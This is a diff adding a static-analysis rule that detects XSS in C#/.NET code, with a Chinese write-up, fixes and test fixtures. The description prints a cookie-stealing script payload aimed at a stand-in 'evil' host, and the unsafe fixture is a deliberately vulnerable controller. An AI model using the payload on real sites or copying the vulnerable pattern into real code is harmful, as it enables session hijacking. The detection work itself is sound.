@@ -1,0 +1,89 @@
+desc(
+	title: "Check C#/.NET XSS via Response.Write"
+	title_zh: "检测 C#/.NET Response.Write 跨站脚本"
+	type: vuln
+	level: high
+	language: csharp
+	risk: "xss"
+	desc: <<<DESC
+### 漏洞描述
+1. **漏洞原理**
+跨站脚本（XSS）在两个条件同时成立时出现：不可信数据进入 Web 应用（反射型通常来自当前请求，存储型来自数据库等后端）；这些数据未经按上下文编码就被写进响应。`Response.Write`、`Html.Raw`、`HtmlString` 会把字符串原样交给浏览器，`<script>`、事件处理属性或其他可执行标记会在受害者浏览器中运行。
+2. **触发场景**
+```csharp
+string msg = Request.QueryString["msg"];
+Response.Write(msg);
+```
+攻击者把链接做成 `?msg=<script>document.location='http://evil/'+document.cookie</script>`，再诱使已登录用户打开。浏览器执行脚本后把 Cookie 发到攻击者站点。
+Razor 中关闭自动编码同样危险：
+```csharp
+@Html.Raw(msg)
+@(new HtmlString(msg))
+```
+反射型 XSS 往往不靠受害者自己输入恶意内容，而是靠邮件或社交工程诱导点击带毒 URL。
+3. **潜在影响**
+- **会话劫持**：窃取 Cookie 或令牌，冒充用户。
+- **页面被篡改**：钓鱼表单、挂马、改写页面内容。
+- **拆掉 CSRF 防护**：脚本可读到防伪令牌并代发请求。
+DESC
+	solution: <<<SOLUTION
+### 修复建议
+#### 1. 输出时按 HTML 上下文编码
+数据离开应用、写入响应前必须编码。这是防止 XSS 的主防线，不能只依赖输入过滤。
+```csharp
+Response.Write(WebUtility.HtmlEncode(msg));
+```
+Razor 默认对 `@model.Name` 编码，不要用 `Html.Raw` 或 `HtmlString` 包裹用户数据。属性值、JavaScript 字符串、URL 各自需要对应编码器，不能只用 HTML 编码应付所有上下文。
+#### 2. 输入校验作为辅助
+对展示字段限制允许的字符与长度。用户名可限定字母数字；不要把拒绝列表当主防御，浏览器会纠正错误 HTML 并赋予额外字符特殊含义。
+#### 3. Content-Security-Policy
+设置 CSP，降低脚本注入成功后的危害。不要关闭 `X-XSS-Protection` 一类浏览器缓解（若仍面向旧浏览器）。
+SOLUTION
+	reference: <<<REFERENCE
+[CWE-79](https://cwe.mitre.org/data/definitions/79.html)
+[OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+REFERENCE
+	rule_id: "353125c8-5cc7-4d67-99a5-0406727f6d51"
+)
+
+<include("csharp-user-input")> as $input
+
+Response.Write as $sink
+Html.Raw as $sink
+
+$sink(* #{until: `* & $input`}->) as $high
+
+alert $high for {
+	title: "C#/.NET XSS via Response.Write",
+	title_zh: "C#/.NET Response.Write 跨站脚本",
+	level: "high",
+	type: "vuln",
+	risk: "xss",
+	message: "检测到用户输入未经编码流入 Response.Write/Html.Raw，存在 XSS 风险。",
+	name: "sink",
+}
+
+desc(
+	lang: csharp
+	alert_min: 1
+	alert_high: 1
+	'file://unsafe_xss.cs': <<<UNSAFE
+using System.Web;
+
+public class Controller {
+    public void Handle(HttpRequest Request, HttpResponse Response) {
+        string q = Request.QueryString["msg"];
+        Response.Write(q);
+    }
+}
+UNSAFE
+	'safefile://safe_xss.cs': <<<SAFE
+using System.Web;
+
+public class Controller {
+    public void Handle(HttpResponse Response) {
+        Response.Write("ok");
+    }
+}
+SAFE
+)
